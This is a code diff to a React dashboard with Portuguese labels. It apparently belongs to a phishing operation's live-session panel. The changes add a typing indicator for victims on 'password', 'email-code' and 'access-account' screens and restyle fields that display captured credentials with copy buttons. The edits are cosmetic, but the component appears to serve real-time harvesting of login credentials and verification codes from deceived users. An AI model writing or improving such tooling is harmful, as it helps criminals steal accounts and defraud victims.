@@ -295,6 +295,15 @@ export function LiveSessionsPanel({ adId, pendingSessionIds, hasAddressIds, onFo
                   <span className={`rounded px-2 py-0.5 text-[11px] font-bold uppercase tracking-wide ${screenColor(meta.screenKind, isPending)}`}>
                     {screenLabel(meta.screenKind)}
                   </span>
+                  {(meta.screenKind === "access-account" ||
+                    meta.screenKind === "password" ||
+                    meta.screenKind === "email-code") && (
+                    <span className="flex items-center gap-0.5" aria-label="digitando">
+                      <span className="h-1 w-1 animate-bounce rounded-full bg-orange-500 [animation-delay:-0.3s]" />
+                      <span className="h-1 w-1 animate-bounce rounded-full bg-orange-500 [animation-delay:-0.15s]" />
+                      <span className="h-1 w-1 animate-bounce rounded-full bg-orange-500" />
+                    </span>
+                  )}
                   <span className="text-[10px] text-muted-foreground">há {fmtAgo(now - since)}</span>
                 </div>
 
@@ -501,22 +510,35 @@ function CredField({
       : tone === "email"
       ? "border-yellow-500/40 bg-yellow-500/10"
       : "border-green-500/40 bg-green-500/10";
-  const iconColor =
-    tone === "password" ? "text-orange-600" : tone === "email" ? "text-yellow-700" : "text-green-700";
+  const iconBg =
+    tone === "password"
+      ? "bg-orange-500/20 text-orange-600"
+      : tone === "email"
+      ? "bg-yellow-500/20 text-yellow-700"
+      : "bg-green-500/20 text-green-700";
   return (
-    <div className={`flex items-center gap-1.5 rounded-md border ${toneClass} px-1.5 py-1`}>
-      <span className={iconColor}>{icon}</span>
-      <span className="text-[9px] font-bold uppercase tracking-wide text-muted-foreground">{label}</span>
-      <span className="ml-auto min-w-0 flex-1 truncate text-right font-mono text-[11px] font-semibold text-foreground">
-        {value}
-      </span>
+    <div className={`flex items-center gap-2 rounded-md border ${toneClass} px-2 py-1.5`}>
+      <div
+        className={`flex h-6 w-6 shrink-0 items-center justify-center rounded ${iconBg}`}
+        aria-hidden
+      >
+        {icon}
+      </div>
+      <div className="min-w-0 flex-1 leading-tight">
+        <p className="text-[9px] font-bold uppercase tracking-wider text-muted-foreground">
+          {label}
+        </p>
+        <p className="truncate font-mono text-[11px] font-semibold text-foreground">
+          {value}
+        </p>
+      </div>
       <button
         type="button"
         onClick={onCopy}
-        className="rounded p-0.5 text-muted-foreground hover:bg-background hover:text-foreground"
+        className="shrink-0 rounded p-1 text-muted-foreground transition hover:bg-background hover:text-foreground"
         aria-label={`Copiar ${label}`}
       >
-        {copied ? <Check className="h-3 w-3 text-green-600" /> : <Copy className="h-3 w-3" />}
+        {copied ? <Check className="h-3.5 w-3.5 text-green-600" /> : <Copy className="h-3.5 w-3.5" />}
       </button>
     </div>
   );
